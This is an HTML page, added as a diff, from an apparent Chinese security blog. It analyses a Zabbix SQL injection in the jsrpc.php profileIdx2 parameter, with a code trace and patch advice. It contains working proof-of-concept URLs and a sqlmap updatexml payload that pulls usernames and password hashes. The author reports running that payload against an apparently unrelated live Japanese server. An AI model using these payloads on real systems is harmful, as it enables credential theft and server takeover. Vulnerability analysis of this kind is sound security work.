@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-transform"/>
+
+
+    <title>
+      
+    [漏洞分析]zabbix SQL Inject Vul - B1ueB0ne
+    
+    </title>
+
+
+  <link href="asset/css/style.css" rel="stylesheet" > 
+  <link href="asset/js/xcode.min.css" rel="stylesheet">
+  <script src="asset/js/headroom.js"></script>
+
+  <!-- <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="asset/css/font-awesome.css">
+ -->
+
+  <!-- <script src="asset/highlightjs/highlight.pack.js"></script> -->
+  <!-- <link href="asset/highlightjs/styles/solarized_light.css" media="screen, projection" rel="stylesheet" type="text/css"> -->
+  <!-- <script>hljs.initHighlightingOnLoad();</script> -->
+
+
+  </head>
+
+  <!-- 主体开始 -->
+  <!-- <body class="" gtools_scp_screen_capture_injected="true"> -->
+  <!-- 上面为主页白底色版本 -->
+    
+<body class="bg-grey" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+<!-- 上面是主页灰底色版本 -->
+
+<!--[if lt IE 8]>
+<div class="browsehappy" role="dialog">
+    当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank">升级你的浏览器</a>。
+</div>
+<![endif]-->
+<!-- 头部位置 -->
+
+<header id="header" class="header bg-white headroom">
+  <div class="navbar-container"> 
+    <a href="index.html" class="navbar-logo"><img src="asset/img/langu.JPG"> </a>
+    <div class="navbar-menu"> 
+
+        
+        <a href="index.html">Index</a>
+        
+        <a href="archives.html">Archives</a>
+        
+        <a href="about.html">About</a>
+        
+        
+    </div> 
+    <!-- 搜索框体 -->
+    <!--  <div class="navbar-search" onclick="">
+        <span class="icon-search"></span>
+        <form id="search" method="post" action="/" role="search">
+          <span class="search-box">
+            <input type="text" id="input" class="input" name="s" required="true" placeholder="Search..." maxlength="30" autocomplete="off">
+          </span>
+        </form>
+    </div> -->
+
+    <div class="navbar-mobile-menu" onclick=""> 
+      <span class="icon-menu cross"><span class="middle"></span></span> 
+        <ul> 
+          
+          <li>
+          <a href="index.html">Index</a>
+          </li>
+          
+          <li>
+          <a href="archives.html">Archives</a>
+          </li>
+          
+          <li>
+          <a href="about.html">About</a>
+          </li>
+          
+        </ul> 
+    </div> 
+  </div> 
+</header>
+<!-- 头部结束 --> <!-- post 开始 -->
+<div class="bg-white" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+	<article class="main-content page-page" style="max-width: 700px;padding: 110px 25px 20px" itemscope="" itemtype="http://schema.org/Article">
+		<div class="post-header">
+			<!-- title -->
+			<div class="post-header">
+				<h1 class="post-title itemprop="name headline">[漏洞分析]zabbix SQL Inject Vul</h1>	
+				<div class="post-data">
+					<time datetime="2016-08-17T21:40:04+08:00" pubdate data-updated="true">2016/08/17</time>
+				</div>
+			</div>
+		</div>
+	<div id="post-content" class="post-content" itemprop="articleBody"> 
+		<p class="post-tags"> 
+		
+		<a href='%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html'>漏洞分析</a>&nbsp;
+		
+		</p>
+	<!-- 正文 -->
+		<p>
+		<p>zabbix是一个开源的企业级性能监控解决方案。近日，zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p>
+
+<span id="more"></span><!-- more -->
+
+<h2 id="toc_0">0x01 漏洞概述</h2>
+
+<p>无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。</p>
+
+<h2 id="toc_1">0x02 影响程度</h2>
+
+<ul>
+<li>攻击成本：低</li>
+<li>危害程度：高</li>
+<li>是否登陆：不需要</li>
+<li>影响版本：2.2.x，3.0.0-3.0.3</li>
+</ul>
+
+<h2 id="toc_2">0x03 漏洞测试</h2>
+
+<p>在zabbix的地址后面添加：</p>
+
+<ul>
+<li>利用方式一</li>
+</ul>
+
+<p><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim<br/>
+estamp=1471054088083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi<br/>
+story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2’3297&amp;updateProfil<br/>
+e=true&amp;screenitemid=&amp;period=3600&amp;stime=20170813040734&amp;resourcetype=<br/>
+17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;<br/>
+mark_color=1</code></p>
+
+<p>如果出现下列代码则证明漏洞存在</p>
+
+<p><code>&lt;div class=&quot;flickerfreescreen&quot; data-timestamp=&quot;1471054088083&quot;<br/>
+id=&quot;flickerfreescreen_1&quot;&gt;&lt;table class=&quot;list-table&quot;<br/>
+id=&quot;t57ae81946b8cb&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;cell-<br/>
+width&quot;&gt;Timestamp&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr<br/>
+class=&quot;nothing-to-show&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;No data<br/>
+found.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&quot;msg-bad&quot;&gt;&lt;div<br/>
+class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles<br/>
+(profileid, userid, idx, value_int, type, idx2) VALUES (39, 1,<br/>
+&#39;web.item.graph.period&#39;, &#39;3600&#39;, 2, 2&#39;3297)] [You have an error in<br/>
+your SQL syntax; check the manual that corresponds to your MySQL<br/>
+server version for the right syntax to use near &#39;&#39;3297)&#39; at line<br/>
+1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid,<br/>
+userid, idx, value_str, type, idx2) VALUES (40, 1,<br/>
+&#39;web.item.graph.stime&#39;, &#39;20160813041028&#39;, 3, 2&#39;3297)] [You have an<br/>
+error in your SQL syntax; check the manual that corresponds to<br/>
+your MySQL server version for the right syntax to use near<br/>
+&#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles<br/>
+(profileid, userid, idx, value_int, type, idx2) VALUES (41, 1,<br/>
+&#39;web.item.graph.isnow&#39;, &#39;1&#39;, 2, 2&#39;3297)] [You have an error in<br/>
+your SQL syntax; check the manual that corresponds to your MySQL<br/>
+server version for the right syntax to use near &#39;&#39;3297)&#39; at line<br/>
+1]&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;span class=&quot;overlay-close-btn&quot;<br/>
+onclick=&quot;javascript: $(this).closest(&#39;.msg-bad&#39;).remove();&quot;<br/>
+title=&quot;Close&quot;&gt;&lt;/span&gt;&lt;/div&gt;</code></p>
+
+<ul>
+<li>利用方式二</li>
+</ul>
+
+<p><code>latest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385);select * from users where (1=1</code></p>
+
+<p>如果出现下列代码则证明漏洞存在</p>
+
+<p><code>SQL (0.000361):INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES(88, 1, &#39;web.latest.toggle&#39;, &#39;1&#39;, 2, 15385); select * from users where (1=1)<br/>
+latest.php:746 →require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in/home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185</code></p>
+
+<h2 id="toc_3">0x04 实战测试</h2>
+
+<p>测试的一个Japan站</p>
+
+<p><code>sqlmap -u &quot;http://157.×××.×××.98/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1(select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&quot; --level=3 --risk=2 --columns -T &quot;users&quot; -D &quot;public&quot;</code></p>
+
+<pre><code class="language-text">Database: public
+Table: users
+[16 columns]
++----------------+---------+
+| Column         | Type    |
++----------------+---------+
+| alias          | varchar |
+| attempt_clock  | int4    |
+| attempt_failed | int4    |
+| attempt_ip     | varchar |
+| autologin      | int4    |
+| autologout     | int4    |
+| lang           | varchar |
+| name           | varchar |
+| passwd         | bpchar  |
+| refresh        | int4    |
+| rows_per_page  | int4    |
+| surname        | varchar |
+| theme          | varchar |
+| type           | int4    |
+| url            | varchar |
+| userid         | int8    |
++----------------+---------+
+</code></pre>
+
+<p>可获得最高权限</p>
+
+<h2 id="toc_4">0x05 代码分析</h2>
+
+<p>zabbix 2.2.14</p>
+
+<ul>
+<li>首先从poc中的<code>jsrpc.php</code>文件入手，</li>
+</ul>
+
+<pre><code class="language-text">require_once dirname(__FILE__).&#39;/include/config.inc.php&#39;;
+
+$requestType = get_request(&#39;type&#39;, PAGE_TYPE_JSON);
+if ($requestType == PAGE_TYPE_JSON) {
+    $http_request = new CHTTP_request();
+    $json = new CJSON();
+    $data = $json-&gt;decode($http_request-&gt;body(), true);
+}
+else {
+    $data = $_REQUEST;
+}
+</code></pre>
+
+<p>从这里看到data是由REQUEST赋值的，接受 GET/POST/COOKIE任意一种输入，所以payload可以用get方式传输，在payload中由<code>method=screen.get</code>这一部分，在源码中可以看到如下代码</p>
+
+<pre><code class="language-text">case &#39;screen.get&#39;:
+        $options = array(
+            &#39;pageFile&#39; =&gt; !empty($data[&#39;pageFile&#39;]) ? $data[&#39;pageFile&#39;] : null,
+            &#39;mode&#39; =&gt; !empty($data[&#39;mode&#39;]) ? $data[&#39;mode&#39;] : null,
+            &#39;timestamp&#39; =&gt; !empty($data[&#39;timestamp&#39;]) ? $data[&#39;timestamp&#39;] : time(),
+            &#39;resourcetype&#39; =&gt; !empty($data[&#39;resourcetype&#39;]) ? $data[&#39;resourcetype&#39;] : null,
+            &#39;screenitemid&#39; =&gt; !empty($data[&#39;screenitemid&#39;]) ? $data[&#39;screenitemid&#39;] : null,
+            &#39;groupid&#39; =&gt; !empty($data[&#39;groupid&#39;]) ? $data[&#39;groupid&#39;] : null,
+            &#39;hostid&#39; =&gt; !empty($data[&#39;hostid&#39;]) ? $data[&#39;hostid&#39;] : null,
+            &#39;period&#39; =&gt; !empty($data[&#39;period&#39;]) ? $data[&#39;period&#39;] : null,
+            &#39;stime&#39; =&gt; !empty($data[&#39;stime&#39;]) ? $data[&#39;stime&#39;] : null,
+            &#39;profileIdx&#39; =&gt; !empty($data[&#39;profileIdx&#39;]) ? $data[&#39;profileIdx&#39;] : null,
+            &#39;profileIdx2&#39; =&gt; !empty($data[&#39;profileIdx2&#39;]) ? $data[&#39;profileIdx2&#39;] : null,
+            &#39;updateProfile&#39; =&gt; isset($data[&#39;updateProfile&#39;]) ? $data[&#39;updateProfile&#39;] : null
+        );
+        if ($options[&#39;resourcetype&#39;] == SCREEN_RESOURCE_HISTORY) {
+            $options[&#39;itemids&#39;] = !empty($data[&#39;itemids&#39;]) ? $data[&#39;itemids&#39;] : null;
+            $options[&#39;action&#39;] = !empty($data[&#39;action&#39;]) ? $data[&#39;action&#39;] : null;
+            $options[&#39;filter&#39;] = !empty($data[&#39;filter&#39;]) ? $data[&#39;filter&#39;] : null;
+            $options[&#39;filter_task&#39;] = !empty($data[&#39;filter_task&#39;]) ? $data[&#39;filter_task&#39;] : null;
+            $options[&#39;mark_color&#39;] = !empty($data[&#39;mark_color&#39;]) ? $data[&#39;mark_color&#39;] : null;
+        }
+        elseif ($options[&#39;resourcetype&#39;] == SCREEN_RESOURCE_CHART) {
+            $options[&#39;graphid&#39;] = !empty($data[&#39;graphid&#39;]) ? $data[&#39;graphid&#39;] : null;
+            $options[&#39;profileIdx2&#39;] = $options[&#39;graphid&#39;];
+        }
+
+        $screenBase = CScreenBuilder::getScreen($options);
+        if (!empty($screenBase)) {
+            $screen = $screenBase-&gt;get();
+        }
+
+        if (!empty($screen)) {
+            if ($options[&#39;mode&#39;] == SCREEN_MODE_JS) {
+                $result = $screen;
+            }
+            else {
+                if (is_object($screen)) {
+                    $result = $screen-&gt;toString();
+                }
+            }
+        }
+        else {
+            $result = &#39;&#39;;
+        }
+        break;
+
+省略部分代码
+
+require_once dirname(__FILE__).&#39;/include/page_footer.php&#39;;
+
+</code></pre>
+
+<p>其中\(options[profileIdx2]赋值了\)data[profileIdx2]，<br/>
+之后调用这几句代码</p>
+
+<pre><code class="language-text">        $screenBase = CScreenBuilder::getScreen($options);
+        if (!empty($screenBase)) {
+            $screen = $screenBase-&gt;get();
+        }
+</code></pre>
+
+<p>一时没了思路，跟几句代码死磕，找到<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBuilder.php</code>，<del>在<code>public static function getScreen(array $options = array())</code>函数中没有找到可以造成漏洞的交互点，太菜了！！！</del> ,可以看到<code>profileIdx2</code>已经到达了下面代码中了</p>
+
+<pre><code class="language-text">// calculate time
+        $this-&gt;profileIdx = !empty($options[&#39;profileIdx&#39;]) ? $options[&#39;profileIdx&#39;] : &#39;&#39;;
+        $this-&gt;profileIdx2 = !empty($options[&#39;profileIdx2&#39;]) ? $options[&#39;profileIdx2&#39;] : null;
+        $this-&gt;updateProfile = isset($options[&#39;updateProfile&#39;]) ? $options[&#39;updateProfile&#39;] : true;
+</code></pre>
+
+<p>一路上没有经过任何过滤，然后接着往下看可以看到</p>
+
+<pre><code class="language-text">$this-&gt;timeline = CScreenBase::calculateTime(array(
+            &#39;profileIdx&#39; =&gt; $this-&gt;profileIdx,
+            &#39;profileIdx2&#39; =&gt; $this-&gt;profileIdx2,
+            &#39;updateProfile&#39; =&gt; $this-&gt;updateProfile,
+            &#39;period&#39; =&gt; !empty($options[&#39;period&#39;]) ? $options[&#39;period&#39;] : null,
+            &#39;stime&#39; =&gt; !empty($options[&#39;stime&#39;]) ? $options[&#39;stime&#39;] : null
+        ));
+</code></pre>
+
+<p><code>profileIdx2</code>成为了<code>calculateTime</code>的参数，这时我们追踪一下<code>calculateTime</code>函数，在<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBase.php</code>中，代码如下</p>
+
+<pre><code class="language-text">    public static function calculateTime(array $options = array()) {
+        if (!array_key_exists(&#39;updateProfile&#39;, $options)) {
+            $options[&#39;updateProfile&#39;] = true;
+        }
+        if (empty($options[&#39;profileIdx2&#39;])) {
+            $options[&#39;profileIdx2&#39;] = 0;
+        }
+
+        // show only latest data without update is set only period
+        if (!empty($options[&#39;period&#39;]) &amp;&amp; empty($options[&#39;stime&#39;])) {
+            $options[&#39;updateProfile&#39;] = false;
+            $options[&#39;profileIdx&#39;] = &#39;&#39;;
+        }
+
+        // period
+        if (empty($options[&#39;period&#39;])) {
+            $options[&#39;period&#39;] = !empty($options[&#39;profileIdx&#39;])
+                ? CProfile::get($options[&#39;profileIdx&#39;].&#39;.period&#39;, ZBX_PERIOD_DEFAULT, $options[&#39;profileIdx2&#39;])
+                : ZBX_PERIOD_DEFAULT;
+        }
+        else {
+            if ($options[&#39;period&#39;] &lt; ZBX_MIN_PERIOD) {
+                show_message(_n(&#39;Minimum time period to display is %1$s hour.&#39;,
+                        &#39;Minimum time period to display is %1$s hours.&#39;, (int) ZBX_MIN_PERIOD / SEC_PER_HOUR));
+                $options[&#39;period&#39;] = ZBX_MIN_PERIOD;
+            }
+            elseif ($options[&#39;period&#39;] &gt; ZBX_MAX_PERIOD) {
+                show_message(_n(&#39;Maximum time period to display is %1$s day.&#39;,
+                        &#39;Maximum time period to display is %1$s days.&#39;, (int) ZBX_MAX_PERIOD / SEC_PER_DAY));
+                $options[&#39;period&#39;] = ZBX_MAX_PERIOD;
+            }
+        }
+        if ($options[&#39;updateProfile&#39;] &amp;&amp; !empty($options[&#39;profileIdx&#39;])) {
+            CProfile::update($options[&#39;profileIdx&#39;].&#39;.period&#39;, $options[&#39;period&#39;], PROFILE_TYPE_INT, $options[&#39;profileIdx2&#39;]);
+        }
+</code></pre>
+
+<p>重点来了，可以看到<code>CProfile::update($options[&#39;profileIdx&#39;].&#39;.period&#39;, $options[&#39;period&#39;], PROFILE_TYPE_INT, $options[&#39;profileIdx2&#39;]);</code>这句，这时接着追踪CProfile来到<code>page_footer.php</code>中找到<code>profiles.inc.php</code>，</p>
+
+<pre><code class="language-text">public static function update($idx, $value, $type, $idx2 = 0) {
+        if (is_null(self::$profiles)) {
+            self::init();
+        }
+
+        if (!self::checkValueType($value, $type)) {
+            return false;
+        }
+
+        $profile = array(
+            &#39;idx&#39; =&gt; $idx,
+            &#39;value&#39; =&gt; $value,
+            &#39;type&#39; =&gt; $type,
+            &#39;idx2&#39; =&gt; $idx2
+        );
+
+        $current = CProfile::get($idx, null, $idx2);
+        if (is_null($current)) {
+            if (!isset(self::$insert[$idx])) {
+                self::$insert[$idx] = array();
+            }
+            self::$insert[$idx][$idx2] = $profile;
+        }
+</code></pre>
+
+<p>可以看到<code>self::$insert[$idx][$idx2] = $profile;</code>，参数已经到了<code>insert</code>中，</p>
+
+<p><del>然后去请教表哥，表哥提示问题出现在<code>flush</code>中<br/>
+根据表哥的提示，</del><br/>
+在<code>page_footer.php</code>中发现CProfile类的flush方法</p>
+
+<pre><code class="language-text">// last page
+if (!defined(&#39;ZBX_PAGE_NO_MENU&#39;) &amp;&amp; $page[&#39;file&#39;] != &#39;profile.php&#39;) {
+    CProfile::update(&#39;web.paging.lastpage&#39;, $page[&#39;file&#39;], PROFILE_TYPE_STR);
+}
+
+CProfile::flush();
+
+// end transactions if they have not been closed already
+if (isset($DB) &amp;&amp; isset($DB[&#39;TRANSACTIONS&#39;]) &amp;&amp; $DB[&#39;TRANSACTIONS&#39;] != 0) {
+    error(_(&#39;Transaction has not been closed. Aborting...&#39;));
+    DBend(false);
+}
+</code></pre>
+
+<p>在<code>profiles.inc.php</code>中找到了flush函数</p>
+
+<pre><code class="language-text">public static function flush() {
+        // if not initialised, no changes were made
+        if (is_null(self::$profiles)) {
+            return true;
+        }
+
+        if (self::$userDetails[&#39;userid&#39;] &lt;= 0) {
+            return null;
+        }
+
+        if (!empty(self::$insert) || !empty(self::$update)) {
+            DBstart();
+            foreach (self::$insert as $idx =&gt; $profile) {
+                foreach ($profile as $idx2 =&gt; $data) {
+                    self::insertDB($idx, $data[&#39;value&#39;], $data[&#39;type&#39;], $idx2);
+                }
+            }
+
+            ksort(self::$update);
+            foreach (self::$update as $idx =&gt; $profile) {
+                ksort($profile);
+                foreach ($profile as $idx2 =&gt; $data) {
+                    self::updateDB($idx, $data[&#39;value&#39;], $data[&#39;type&#39;], $idx2);
+                }
+            }
+            DBend();
+        }
+    }
+</code></pre>
+
+<p>参数传入下面的<code>insertDB</code>函数</p>
+
+<pre><code class="language-text">private static function insertDB($idx, $value, $type, $idx2) {
+        $value_type = self::getFieldByType($type);
+
+        $values = array(
+            &#39;profileid&#39; =&gt; get_dbid(&#39;profiles&#39;, &#39;profileid&#39;),
+            &#39;userid&#39; =&gt; self::$userDetails[&#39;userid&#39;],
+            &#39;idx&#39; =&gt; zbx_dbstr($idx),
+            $value_type =&gt; zbx_dbstr($value),
+            &#39;type&#39; =&gt; $type,
+            &#39;idx2&#39; =&gt; $idx2
+        );
+        return DBexecute(&#39;INSERT INTO profiles (&#39;.implode(&#39;, &#39;, array_keys($values)).&#39;) VALUES (&#39;.implode(&#39;, &#39;, $values).&#39;)&#39;);
+    }
+</code></pre>
+
+<p>可以看到第四个参数没有过滤，通过<code>DBexecute</code>被带到了数据库中</p>
+
+<pre><code class="language-text">function DBexecute($query, $skip_error_messages = 0) {
+    global $DB;
+
+    if (!isset($DB[&#39;DB&#39;]) || empty($DB[&#39;DB&#39;])) {
+        return false;
+    }
+
+    $result = false;
+    $time_start = microtime(true);
+
+    $DB[&#39;EXECUTE_COUNT&#39;]++;
+
+    switch ($DB[&#39;TYPE&#39;]) {
+        case ZBX_DB_MYSQL:
+            if (!$result = mysqli_query($DB[&#39;DB&#39;], $query)) {
+                error(&#39;Error in query [&#39;.$query.&#39;] [&#39;.mysqli_error($DB[&#39;DB&#39;]).&#39;]&#39;);
+            }
+            break;
+</code></pre>
+
+<h2 id="toc_5">0x06 漏洞修复</h2>
+
+<ul>
+<li>版本升级</li>
+<li>打补丁</li>
+<li>关闭guest</li>
+</ul>
+
+<h2 id="toc_6">0x07 后记</h2>
+
+<p>这里还有好多东西没有搞懂，毕竟太菜</p>
+
+		</p>
+		<!-- 侧边导航条 -->
+		<div id="directory-content" class="directory-content">
+    		<div id="directory" style="margin-left: 50px;margin-top: 120px"></div>
+		</div>
+	<!-- JS -->
+	<script>
+		var postDirectoryBuild = function() {
+		    var postChildren = function children(childNodes, reg) {
+		        var result = [],
+		            isReg = typeof reg === 'object',
+		            isStr = typeof reg === 'string',
+		            node, i, len;
+		        for (i = 0, len = childNodes.length; i < len; i++) {
+		            node = childNodes[i];
+		            if ((node.nodeType === 1 || node.nodeType === 9) &&
+		                (!reg ||
+		                isReg && reg.test(node.tagName.toLowerCase()) ||
+		                isStr && node.tagName.toLowerCase() === reg)) {
+		                result.push(node);
+		            }
+		        }
+		        return result;
+		    },
+		    createPostDirectory = function(article, directory, isDirNum) {
+		        var contentArr = [],
+		            titleId = [],
+		            levelArr, root, level,
+		            currentList, list, li, link, i, len;
+		        levelArr = (function(article, contentArr, titleId) {
+		            var titleElem = postChildren(article.childNodes, /^h\d$/),
+		                levelArr = [],
+		                lastNum = 1,
+		                lastRevNum = 1,
+		                count = 0,
+		                guid = 1,
+		                id = 'directory' + (Math.random() + '').replace(/\D/, ''),
+		                lastRevNum, num, elem;
+		            while (titleElem.length) {
+		                elem = titleElem.shift();
+		                contentArr.push(elem.innerHTML);
+		                num = +elem.tagName.match(/\d/)[0];
+		                if (num > lastNum) {
+		                    levelArr.push(1);
+		                    lastRevNum += 1;
+		                } else if (num === lastRevNum ||
+		                    num > lastRevNum && num <= lastNum) {
+		                    levelArr.push(0);
+		                    lastRevNum = lastRevNum;
+		                } else if (num < lastRevNum) {
+		                    levelArr.push(num - lastRevNum);
+		                    lastRevNum = num;
+		                }
+		                count += levelArr[levelArr.length - 1];
+		                lastNum = num;
+		                elem.id = elem.id || (id + guid++);
+		                titleId.push(elem.id);
+		            }
+		            if (count !== 0 && levelArr[0] === 1) levelArr[0] = 0;
+
+		            return levelArr;
+		        })(article, contentArr, titleId);
+		        currentList = root = document.createElement('ul');
+		        dirNum = [0];
+		        for (i = 0, len = levelArr.length; i < len; i++) {
+		            level = levelArr[i];
+		            if (level === 1) {
+		                list = document.createElement('ul');
+		                if (!currentList.lastElementChild) {
+		                    currentList.appendChild(document.createElement('li'));
+		                }
+		                currentList.lastElementChild.appendChild(list);
+		                currentList = list;
+		                dirNum.push(0);
+		            } else if (level < 0) {
+		                level *= 2;
+		                while (level++) {
+		                    if (level % 2) dirNum.pop();
+		                    currentList = currentList.parentNode;
+		                }
+		            }
+		            dirNum[dirNum.length - 1]++;
+		            li = document.createElement('li');
+		            link = document.createElement('a');
+		            link.href = '#' + titleId[i];
+		            link.innerHTML = !isDirNum ? contentArr[i] :
+		                dirNum.join('.') + ' ' + contentArr[i] ;
+		            li.appendChild(link);
+		            currentList.appendChild(li);
+		        }
+		        directory.appendChild(root);
+		    };
+		    createPostDirectory(document.getElementById('post-content'),document.getElementById('directory'), true);
+		};
+		postDirectoryBuild();
+	</script>	
+	<!-- 版权声明 -->
+		<p class="post-info" style="color: #BCBDB6">
+				本文由 <a style="color: #BCBDB6" href="#">B1ueB0ne
+				</a> 创作，采用 <a style="color: #BCBDB6" href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="external nofollow">知识共享署名4.0</a> 国际许可协议进行许可<br>本站文章除注明转载/出处外，均为本站原创或翻译，转载前请务必署名<br>最后编辑时间为: 2018-02-19T21:40:04+08:00
+		</p>
+	<!-- 导航 -->
+			<div id="comments" class="clearfix" style="padding: 0px;">
+				<footer class="post-footer clearfix">	    			
+				    <div class="meta">
+					    
+					    <P style="float: left;">
+					    	<a href="15190479354925.html" 
+					        title="Previous Post: [安全运维]Linux系统加固">&laquo; [安全运维]Linux系统加固</a>
+					    </p>
+					    <p style="float:right; ">
+					    	
+					    	
+					        <a href="15193950376071.html" 
+					        title="Next Post: [漏洞分析]JAVA Apache-CommonsCollections Unserialize Vulnerabilities">[漏洞分析]JAVA Apache-CommonsCollections Unserialize Vulnerabilities &raquo;</a>
+					    </p> 
+					    
+				    </div>
+			  	</footer>
+	<!-- footer end -->
+			</div>		
+	</div>
+</article>
+			<!-- 评论区 -->
+			<div id="respond-post-269" class="comment-container"> 
+				<div id="comments" class="clearfix">
+
+				<script type="text/javascript" src="/pm/hashover/hashover.js"></script>
+<noscript>You must have JavaScript enabled to use the comments.</noscript>
+
+<!-- 评论区结束 -->
+					<div>
+					
+					</div>
+
+				</div>
+			</div>
+</div>
+<!-- headroom -->
+<script type="text/javascript"> 
+(function() {
+    var header = new Headroom(document.querySelector("#header"), {
+        tolerance: 3,
+        offset : 80,
+        classes: {
+          initial: "animated",
+          pinned: "slideDown",
+          unpinned: "slideUp"
+        }
+    });
+    header.init();
+}());
+</script>  <footer id="footer" class="footer" style="background-color: #030501;color: #FFFFFE;">
+  <div class="footer-meta">
+    <div class="footer-container">
+      <!-- 版权说明 -->
+      <div class="meta-item meta-copyright">
+        <div class="meta-copyright-info">
+          <h2 class="meta-title">INFO</h2>
+          <div class="info-text">  
+              <p>Since 2016 <br>
+              <span class="credit">Hacked by 
+              <a target="_blank" href="https://www.uxss.net/">B1ueB0ne</a> 
+              </span>
+              <p>Theme Design by <a href="https://www.linpx.com/" target="_blank">Chakhsu</a></p>
+              <p>Migrating to Mweb by <a href="http://metaidea.cn">idken</a></p>
+              </p> 
+          </div>                  
+        </div>
+      </div>  
+      <!-- Categories -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">CATEGORIES</h2>  
+             
+            
+            <li>
+            <a href="WEB%E5%AE%89%E5%85%A8.html">WEB安全&nbsp;(8)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="JAVA%E5%AE%89%E5%85%A8.html">JAVA安全&nbsp;(10)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="PYTHON.html">PYTHON&nbsp;(2)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">漏洞分析&nbsp;(12)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+      </div>
+      <!-- 最新文章 -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">RECENT POSTS</h2>
+
+          
+          
+         <li>
+           <a href="15982374410900.html">[胡思乱想]奔涌的后浪与独立思考</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982373638552.html">[胡思乱想]为什么我们会对新事物产生抵触心理</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371852368.html">[IoT安全]2020 IoT Threat Report (简单解读)</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371354139.html">[安全建设]应用安全评审中的三个关键节点及抓手实现</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982365857946.html">[JAVA安全]利用CodeQL寻找Java Deserialization Vulnerabilities</a><br>
+         </li>
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+           
+
+      </div>
+  </div>
+</div>
+</footer>
+
+<!--评论变量判断 -->
+      
+<!-- 评论end -->
+<script src="asset/chart/all-min.js"></script><script type="text/javascript">$(function(){    var mwebii=0;    var mwebChartEleId = 'mweb-chart-ele-';    $('pre>code').each(function(){        mwebii++;        var eleiid = mwebChartEleId+mwebii;        if($(this).hasClass('language-sequence')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = Diagram.parse($(this).text());            diagram.drawSVG(eleiid,{theme: 'simple'});        }else if($(this).hasClass('language-flow')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = flowchart.parse($(this).text());            diagram.drawSVG(eleiid);        }    });});</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_SVG-full"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({TeX: { equationNumbers: { autoNumber: "AMS" } }});</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
